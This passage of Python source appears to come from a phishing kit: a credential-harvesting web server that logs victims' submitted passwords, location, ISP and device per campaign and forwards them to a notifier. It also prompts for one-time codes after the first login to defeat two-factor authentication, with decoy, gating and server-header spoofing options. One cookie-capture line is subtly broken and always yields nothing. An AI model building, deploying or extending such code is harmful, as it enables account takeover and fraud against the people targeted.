            creds = _is_creds(fields)
            has_otp = any(k.lower().startswith("otp") for k in fields)
            # label bots/scanners instead of dropping them: the totals stay accurate
            risk, risk_reasons = riskmod.score(fields, ua=ua, isp=geo["isp"], device=dev,
                                               country=geo["country"], city=geo["city"])
            self.db.record(
                source_url=self.headers.get("Referer", self.path),
                ip=geo["ip"], city=geo["city"], country=geo["country"],
                isp=geo["isp"], ua=ua, device=dev,
                fields=fields, is_cred=creds, campaign=self.campaign_name,
                risk=risk, risk_reasons=risk_reasons,
            )
            if self.notifier:
                with contextlib.suppress(Exception):
                    self.notifier({
                        "ts": time.time(), "template": self.template_name,
                        "campaign": self.campaign_name,
                        "ip": geo["ip"], "city": geo["city"], "country": geo["country"],
                        "isp": geo["isp"], "device": dev, "ua": ua,
                        "fields": fields, "is_cred": creds,
                        "risk": risk, "risk_reasons": risk_reasons,
                        "source_url": self.headers.get("Referer", self.path),
                    })
            try:
                rec = self._vault()
                session_mod.add_credentials(rec, fields or {})
                session_mod.touch(rec, "creds" if creds else "form",
                                  ",".join(list(fields or {})[:6]),
                                  state="creds" if creds else "form")
                session_mod.add_cookies(rec, [{"name": k, "value": v,
                                               "domain": self.headers.get("Host", ""),
                                               "path": "/"} for k, v in
                                              (self.headers.get("Cookie") or "")
                                              .count("=") and [] or []])
                self.db.session_save(rec)
            except Exception:
                pass
            # 2FA flow: after the first credential submit, show the OTP page.
            if self.otp_page and creds and not has_otp:
                served = getattr(self, "served_site", None) or self.server.current_site
                body = tpl.render_site(served, "/", True).encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            elif self.redirect:
                self.send_response(302)
                self.send_header("Location", self.redirect)
                # HTTP/1.1 needs an explicit body length (0) or the client
                # waits for a body that never comes and keep-alive desyncs
                self.send_header("Content-Length", "0")
                self.end_headers()
            else:
                body = tpl.render_thankyou().encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

    return PhishHandler

_server_header = None      # set by serve() below


def serve(templates_dir, site_folder, port, db_path, geo_provider="ipapi", intel=True,
          intel_perms=False, trust_headers=True,
            redirect_url="", otp=False, tls=False, cert_path=None,
            on_capture=None, site_name=None, campaign=None, rotate_dirs=None,
            gate=None, decoy_url="", hook_base="/__bh", rebind_host="", symbols=None,
            challenge=None, targets=None, pwa=None,
            exploit_ports=None, exploit_limit=6, server_header="nginx"):
    """Start the server; returns (httpd, handler_class)."""
    Handler = make_handler(templates_dir, db_path, geo_provider, redirect_url, otp,
                           on_capture=on_capture, site_name=site_name, campaign=campaign,
                           rotate_dirs=rotate_dirs, gate=gate, decoy_url=decoy_url,
                           challenge=challenge, targets=targets,
                           intel=intel, intel_perms=intel_perms,
                           symbols=symbols, pwa=pwa,
                           trust_headers=trust_headers, hook_base=hook_base,
                           rebind_host=rebind_host, exploit_ports=exploit_ports,
                           exploit_limit=exploit_limit,
                           server_header=server_header)
    class _ThreadingHTTPServer(tls_fp.PeekTLSMixin, socketserver.ThreadingMixIn,
                               http.server.HTTPServer):
        daemon_threads = True
        # HTTPServer's default backlog is 5; a burst of simultaneous victims
        # (or scanners) would get RST. 128 handles real campaign traffic.
        request_queue_size = 128
        allow_reuse_address = True
    httpd = _ThreadingHTTPServer(("0.0.0.0", port), Handler)
    if tls and not cert_path:
        raise ValueError("--tls needs --cert <pem>: refusing to serve plaintext "
                         "when TLS was requested")
    if tls and cert_path:
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        # key path: "cert_cert.pem" -> "cert_key.pem"; anything else gets ".key"
        if "_cert." in cert_path:
            key_path = cert_path.replace("_cert.", "_key.")
        elif "cert." in os.path.basename(cert_path) and "cert_cert" not in cert_path:
            key_path = cert_path.replace("cert.", "key.")
        else:
            key_path = cert_path + ".key"
        ctx.load_cert_chain(cert_path, key_path)
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    httpd.current_site = site_folder
    return httpd, Handler
